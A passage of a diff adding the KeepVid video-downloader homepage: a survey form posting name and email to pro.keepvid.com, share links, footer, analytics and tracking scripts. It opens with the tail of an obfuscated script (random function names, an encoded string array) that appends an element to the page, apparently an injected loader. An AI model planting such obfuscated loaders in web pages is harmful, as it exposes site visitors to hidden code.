true;blwqveiciykaxgytaawhscdqbndqrc()};document[_$_b7fa[24]](_$_b7fa[86])[0][_$_b7fa[50]](fibomvutzorawseticlkhflwfayksu)}else {blwqveiciykaxgytaawhscdqbndqrc()} 
+
+/*end js*/
+
+ </script>
+</div>		</div>
+	</div>
+	<div class="clear"></div>
+</div>
+<div class="glay-bg">
+	<div class="container">
+		<h2 class="h-title">What you're expecting about KeepVid:</h2>
+		<div class="input-box">
+			<div class="box-fl"><input type="text" name="download_from" title="What new site you'd like to download from" class="ipt-style" value="" placeholder="What new site you'd like to download from:"></div>
+			<div class="box-fr"><input type="text" name="name" title="What we can call you" class="ipt-style" value="" placeholder="What we can call you:"></div>
+			<div class="box-fl"><input type="text" name="email" title="Your Email Address" class="ipt-style" value="" placeholder="Your Email Address:"></div>
+			<div class="box-fr"><a href="javascript:;" onclick="sendInfo()" class="btn-submit">Submit</a></div>
+			<div class="clear"></div>
+		</div>
+		<h2 class="h-title mt50">Share with Friends</h2>
+		<div class="share-box">
+			<a href="http://www.facebook.com/sharer.php?u=keepvid.com/&t=The Best Free Online Downloader" target="_blank"><img src="style/images/btn_facebook.png" alt=""/></a>
+			<a href="http://twitter.com/home?status=The Best Free Online Downloader, go to keepvid.com/" target="_blank"><img src="style/images/btn_twitter.png" alt=""/></a>
+			<a href="https://plus.google.com/share?url=keepvid.com" target="_blank"><img src="style/images/btn_google.png" alt=""/></a></div>
+	</div>
+</div>
+	<div class="container pad50">
+    <h2 class="h-title ac">100% Safe & Privacy Protected</h2>
+    <div class="ac mt30"><img src="style/images/safe-pic.png" alt=""/></div>
+</div>
+<div class="glay-bg" style="display: none;">
+    <div class="container">
+        <h2 class="h-title ac">Tips & Tricks</h2>
+        <ul class="list-info">
+            <li><a href="#">• Download video/music from 10,000 more sites!</a></li>
+            <li><a href="#">• Download video/music playlists in bulk.</a></li>
+            <li><a href="#">• Record any music from internet with high quality.</a></li>
+            <li><a href="#">• Fix music tags and album covers automatically.</a></li>
+            <li><a href="#">• Download video/music from 10,000 more sites!</a></li>
+            <li><a href="#">• Download video/music playlists in bulk.</a></li>
+            <li><a href="#">• Record any music from internet with high quality.</a></li>
+            <li><a href="#">• Fix music tags and album covers automatically.</a></li>
+            <div class="clear"></div>
+        </ul>
+    </div>
+</div>
+<div class="bluy-bg">
+    <div class="container">
+        <h2 class="h-title ac">
+        Expand Your Video Collection		</h2>
+        <div class="icon-box">
+            <div class="item">
+                <dl>
+                    <a href="/">
+                        <dd><img src="style/images/icon1.png" alt="Online"/></dd>
+                        <dt>Online</dt>
+                    </a>
+                </dl>
+            </div>
+            <div class="item">
+                <dl>
+                    <a href="https://pro.keepvid.com/" target="_blank">
+                        <dd><img src="style/images/icon2.png" alt="KeepVid Pro"/></dd>
+                        <dt>KeepVid Pro</dt>
+                    </a>
+                </dl>
+            </div>
+            <div class="item">
+                <dl>
+                    <a href="https://pro.keepvid.com/keepvid-music/" target="_blank">
+                        <dd><img src="style/images/icon3.png" alt="KeepVid Music"/></dd>
+                        <dt>KeepVid Music</dt>
+                    </a>
+                </dl>
+            </div>
+            <div class="clear"></div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript" src="script/jquery.flexslider-min.js"></script>
+<script type="text/javascript">
+    $(function(){
+        $('.flexslider').flexslider({
+            animation: "slide",
+            pauseOnHover:true,
+            directionNav: false,
+            slideshowSpeed:5000
+        });
+    })
+</script><div class="container btm-text">
+	<ul class="switches">
+		<li>Show Log: <a id="logon" onclick="return ckswitch('log','off');">On</a><a id="logoff" onclick="return ckswitch('log','on');">Off</a></li>
+	</ul>
+</div>
+<div class="footer_bottom">
+    <div class="container">
+        <h3 style="color: #ccc; font-size:12px;">
+        	<a href="/sites/download-youtube-video.html" style="color: #ccc; font-weight:400;">YouTube Downloader</a>
+        	&nbsp;
+        	<a href="/sites/download-dailymotion-video.html" style="color: #ccc; font-weight:400;">Dailymotion Download</a>
+        	&nbsp;&nbsp;&nbsp;
+        	KeepVid - The Best Free Online Video Downloader        </h3>
+        <div class="info" style="padding-top: 0px;"> <span class="copyright"> Copyright©2017 KeepVid. All Rights Reserved. <a href="/contact">Contact Us</a>| <a href="/terms">Privacy &amp; Terms</a> | <a href="/official-keepvid-domains.html">Official Domains</a> </span> </div>
+    </div>
+</div><script type="text/javascript" src="script/poshytip/jquery.poshytip.min.js"></script>
+<link rel="stylesheet" type="text/css" href="script/poshytip/tip-yellowsimple/tip-yellowsimple.css">
+<script type="text/javascript">
+	function isEmail(str){
+		var reg = /^([a-zA-Z0-9]+[_|.]?)*[a-zA-Z0-9]+@([a-zA-Z0-9]+[_|.]?)*[a-zA-Z0-9]+.[a-zA-Z]{2,3}$/;
+		return reg.test(str);
+	}
+	function sendInfo() {
+		var site = $(".input-box input[name='download_from']");
+		var name = $(".input-box input[name='name']");
+		var email = $(".input-box input[name='email']");
+		if(site.val() == ''){
+			site.poshytip({
+				className: 'tip-yellowsimple',
+				showOn: 'focus',
+				alignTo: 'target',
+				alignX: 'inner-left',
+				offsetX: 0,
+				offsetY: 5
+			}).focus();
+			return false;
+		}
+		if(name.val() == ''){
+			name.poshytip({
+				className: 'tip-yellowsimple',
+				showOn: 'focus',
+				alignTo: 'target',
+				alignX: 'inner-left',
+				offsetX: 0,
+				offsetY: 5
+			}).focus();
+			return false;
+		}
+		if(email.val() == '' || !isEmail(email.val())){
+			email.poshytip({
+				className: 'tip-yellowsimple',
+				showOn: 'focus',
+				alignTo: 'target',
+				alignX: 'inner-left',
+				offsetX: 0,
+				offsetY: 5
+			}).focus();
+			return false;
+		}
+		$.ajax({
+			async:false,
+			url: 'https://pro.keepvid.com/servers/public/',
+			type: "GET",
+				data: { c: "savedata", a: "keepvid", site: site.val(), name: name.val(), email: email.val() },
+				dataType: "jsonp",
+				//jsonp: "callback",
+				jsonpCallback: "OnPostMessSuccessByjsonp"
+		});
+	}
+	function OnPostMessSuccessByjsonp($m) {
+		if($m.stauts == 'y'){
+			alert('Your request has been submitted successfully. Thanks!');
+			window.location.reload();
+		}else{
+			alert('Your request wasn’t submitted successfully. Please try again.');
+		}
+	}
+	var isAndroid = navigator.userAgent.toLowerCase().match(/android/i) == "android";
+	var isIphone = navigator.userAgent.toLowerCase().match(/iphone os/i) == "iphone os";
+	var isIpad = navigator.userAgent.toLowerCase().match(/ipad/i) == "ipad";
+	var isWinPhone = navigator.userAgent.toLowerCase().match(/windows phone/i) == "windows phone";
+	if(isAndroid || isIphone || isIpad || isWinPhone)
+	{
+		$(function() {
+			$(".adbox1").show();
+			$(".adbox2").hide();
+			$(".pc_hidden").hide();
+			$(".desk_soft").hide();
+		});
+	}
+</script>
+<style>
+	@media (max-width: 979px) {
+		.ada, .adc{background:none;width:auto;}
+	}
+</style>
+<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-80717639-3', 'auto');
+	ga('send', 'pageview');
+
+</script>
+
+<script language="JavaScript" type="text/javascript" src="https://cbs.wondershare.es/jslibs/track.js"></script>
+</body>
+</html>
